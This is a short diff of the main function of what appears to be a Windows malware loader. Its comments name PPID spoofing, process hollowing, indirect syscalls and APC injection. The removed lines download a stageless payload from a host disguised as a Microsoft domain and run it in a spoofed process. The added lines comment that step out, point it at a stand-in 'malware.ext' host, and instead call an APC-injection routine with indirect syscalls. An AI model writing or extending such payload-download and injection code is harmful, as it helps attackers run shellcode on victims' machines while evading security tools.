@@ -12,11 +12,26 @@ int main()
     // PPID spoofing
     // Process hollowing
     // Indirect syscalls execution
-    
-    DWORD pid = GetPID();
-    
-    // Raw stageless payload targetting microsoft.lestutosdeprocessus.fr
-    std::vector<BYTE> sh = Download(L"microsoft.lestutosdeprocessus.fr\0", L"/payload.bin\0");
+    // APC execution
 
-    execution(sh, pid);
+
+
+
+    // Get spoolsv PID for PPI spoofing
+    // DWORD pid = GetPID();
+
+    // For payload download 
+    // std::vector<BYTE> sh = Download(L"malware.ext\0", L"/payload.bin\0");
+
+    // For synchronous payload execution with PPID spoofing
+    // raw_exec_ppid(sh, pid);
+
+
+
+
+    // For APC execution with indirect syscalls
+    IndirectAPC();
+
+
+
 }
